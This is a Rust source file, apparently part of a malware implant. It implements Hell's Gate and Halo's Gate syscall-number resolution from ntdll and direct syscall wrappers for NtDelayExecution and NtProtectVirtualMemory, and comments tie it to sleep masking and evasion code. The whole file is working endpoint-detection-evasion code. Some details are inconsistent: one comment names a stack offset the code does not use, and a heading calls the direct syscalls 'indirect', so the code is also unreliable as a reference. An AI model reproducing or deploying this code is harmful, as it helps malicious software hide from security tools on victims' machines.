/// Hell's Gate + Halo's Gate — resolve SSNs from ntdll and call them via
/// direct `syscall` without going through the IAT or ntdll stubs.
///
/// Only the syscalls we actually use are exposed:
///   - NtDelayExecution   (sleep masking)
///   - NtProtectVirtualMemory (memory protection changes from evasion code)
///
/// Stack-spoofing stubs are intentionally omitted: the 110-byte
/// arg-sliding design corrupts the caller's frame, as proven by the Nim
/// Phase 10 failure. Plain direct syscalls are safer and sufficient.

use std::sync::OnceLock;
use std::arch::asm;

pub struct Gates {
    pub nt_delay_execution:        u32,
    pub nt_protect_virtual_memory: u32,
    pub nt_write_virtual_memory:   u32,
    pub nt_allocate_virtual_memory: u32,
}

static GATES: OnceLock<Gates> = OnceLock::new();

/// Resolve SSNs at startup. Call once before any `nt_*` functions.
pub fn init() {
    GATES.get_or_init(|| unsafe { resolve() });
}

fn gates() -> &'static Gates {
    GATES.get_or_init(|| unsafe { resolve() })
}

/// Return the NtDelayExecution SSN without going through the full gates() path.
/// Used by evasion::sleep_masked() to copy the SSN to a stack variable BEFORE
/// XOR-masking .data (where GATES lives).
pub fn delay_ssn() -> u32 {
    gates().nt_delay_execution
}

// ── SSN resolution ────────────────────────────────────────────────────────────

unsafe fn resolve() -> Gates {
    let ntdll_w: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
    let base = GetModuleHandleW(ntdll_w.as_ptr()) as usize;

    Gates {
        nt_delay_execution:         find_ssn(base, b"NtDelayExecution\0"),
        nt_protect_virtual_memory:  find_ssn(base, b"NtProtectVirtualMemory\0"),
        nt_write_virtual_memory:    find_ssn(base, b"NtWriteVirtualMemory\0"),
        nt_allocate_virtual_memory: find_ssn(base, b"NtAllocateVirtualMemory\0"),
    }
}

/// Read SSN from a ntdll export.  Returns a hard-coded fallback on failure so
/// the agent still compiles to a working binary even on patched systems.
unsafe fn find_ssn(ntdll: usize, name: &[u8]) -> u32 {
    // Fallback SSNs — correct for Windows 10/11 22H2 unpatched.
    let fallback: u32 = match name {
        b"NtDelayExecution\0"        => 0x34,
        b"NtProtectVirtualMemory\0"  => 0x50,
        b"NtWriteVirtualMemory\0"    => 0x3a,
        b"NtAllocateVirtualMemory\0" => 0x18,
        _ => 0xffff,
    };

    let exp = match export_dir(ntdll) {
        Some(e) => e,
        None => return fallback,
    };

    let n      = exp.num_names;
    let names  = (ntdll + exp.names_rva) as *const u32;
    let ords   = (ntdll + exp.ords_rva)  as *const u16;
    let fns    = (ntdll + exp.fns_rva)   as *const u32;

    for i in 0..n {
        let nm_ptr = (ntdll + *names.add(i) as usize) as *const u8;
        if !names_match(nm_ptr, name) { continue; }

        let ord    = *ords.add(i) as usize;
        let fn_rva = *fns.add(ord) as usize;
        let fn_ptr = (ntdll + fn_rva) as *const u8;

        if let Some(ssn) = read_ssn(fn_ptr) {
            return ssn;
        }
        // Halo's Gate: function is hooked (starts with JMP/CALL).
        // Scan neighbouring exports — they share the same stub template
        // and increment SSN by 1 for each position.
        return halo_scan(ntdll, fns, ords, n, i, fallback);
    }
    fallback
}

/// Try to extract the SSN from the bytes at fn_ptr.
/// Pattern: 4C 8B D1  B8 xx xx 00 00 (mov r10,rcx; mov eax,SSN)
unsafe fn read_ssn(fn_ptr: *const u8) -> Option<u32> {
    // Skip over a JMP if this is a forwarder or trampoline to another stub
    let p = if *fn_ptr == 0xE9 {
        // Relative JMP: dest = fn_ptr + 5 + i32_offset
        let offset = *(fn_ptr.add(1) as *const i32);
        fn_ptr.add(5).offset(offset as isize)
    } else {
        fn_ptr
    };

    if *p == 0x4c && *p.add(1) == 0x8b && *p.add(2) == 0xd1 && *p.add(3) == 0xb8 {
        let ssn = *(p.add(4) as *const u32);
        if ssn < 0x1000 { return Some(ssn); } // sanity check
    }
    None
}

/// Halo's Gate: scan exports ±16 positions to find an unhooked neighbour,
/// then derive our target SSN from the neighbour SSN ± distance.
unsafe fn halo_scan(
    ntdll: usize,
    fns: *const u32,
    ords: *const u16,
    n: usize,
    hooked_idx: usize,
    fallback: u32,
) -> u32 {
    for delta in 1usize..=16 {
        for &offset in &[delta as isize, -(delta as isize)] {
            let j = hooked_idx as isize + offset;
            if j < 0 || j as usize >= n { continue; }
            let ord    = *ords.add(j as usize) as usize;
            let fn_rva = *fns.add(ord) as usize;
            let fn_ptr = (ntdll + fn_rva) as *const u8;
            if let Some(ssn) = read_ssn(fn_ptr) {
                // Adjust: target SSN = neighbour SSN - delta_from_neighbour_to_target
                // (SSNs are assigned in export-table address order, monotonically increasing)
                let target_ssn = ssn.wrapping_add_signed(-(offset as i32));
                return target_ssn;
            }
        }
    }
    fallback
}

struct ExportDir {
    num_names: usize,
    names_rva: usize,
    ords_rva:  usize,
    fns_rva:   usize,
}

unsafe fn export_dir(base: usize) -> Option<ExportDir> {
    if *(base as *const u16) != 0x5A4D { return None; } // MZ
    let e_lfanew = *(base.wrapping_add(0x3c) as *const u32) as usize;
    let nt = base + e_lfanew;
    if *(nt as *const u32) != 0x0000_4550 { return None; } // PE
    // DataDirectory[0].VirtualAddress is at: nt + 4 (sig) + 20 (FileHeader) + 112 (OptHdr fields)
    let exp_rva = *(nt.wrapping_add(4 + 20 + 112) as *const u32) as usize;
    if exp_rva == 0 { return None; }
    let exp = base + exp_rva;
    Some(ExportDir {
        num_names: *(exp.wrapping_add(24) as *const u32) as usize, // NumberOfNames
        fns_rva:   *(exp.wrapping_add(28) as *const u32) as usize, // AddressOfFunctions
        names_rva: *(exp.wrapping_add(32) as *const u32) as usize, // AddressOfNames
        ords_rva:  *(exp.wrapping_add(36) as *const u32) as usize, // AddressOfNameOrdinals
    })
}

unsafe fn names_match(ptr: *const u8, name: &[u8]) -> bool {
    for (i, &b) in name.iter().enumerate() {
        if *ptr.add(i) != b { return false; }
    }
    true
}

// ── Indirect syscall wrappers ─────────────────────────────────────────────────

/// NtDelayExecution(Alertable=FALSE, Interval=negative_100ns_units)
/// `ms` — milliseconds to sleep.
pub unsafe fn nt_delay_execution(ms: u64) {
    let ssn = gates().nt_delay_execution;
    let mut interval: i64 = -(ms as i64 * 10_000); // 100ns units, negative = relative
    asm!(
        "mov r10, rcx",
        "syscall",
        in("eax") ssn,
        in("rcx") 0usize,                         // Alertable = FALSE
        in("rdx") &mut interval as *mut i64,
        lateout("rcx") _,
        lateout("r11") _,
        options(nostack),
    );
}

/// NtProtectVirtualMemory — 5-arg syscall.
/// Returns NTSTATUS (0 = success).
pub unsafe fn nt_protect_virtual_memory(
    handle:   usize,
    base_ptr: *mut *mut u8,
    size_ptr: *mut usize,
    new_prot: u32,
    old_prot: *mut u32,
) -> i32 {
    let ssn = gates().nt_protect_virtual_memory;
    let mut result: i32;
    // 5th arg goes at [rsp+0x28] per Windows x64 syscall convention.
    // We reserve shadow space + arg5 slot and write it manually.
    asm!(
        "sub rsp, 0x28",          // shadow space (0x20) + arg5 slot (0x08)
        "mov [rsp+0x20], {old}",  // arg5 = old_prot pointer
        "mov r10, rcx",
        "syscall",
        "add rsp, 0x28",
        old = in(reg) old_prot,
        in("eax")  ssn,
        in("rcx")  handle,
        in("rdx")  base_ptr,
        in("r8")   size_ptr,
        in("r9")   new_prot as usize,
        lateout("rax") result,
        lateout("rcx") _,
        lateout("r11") _,
        options(nostack),
    );
    result
}
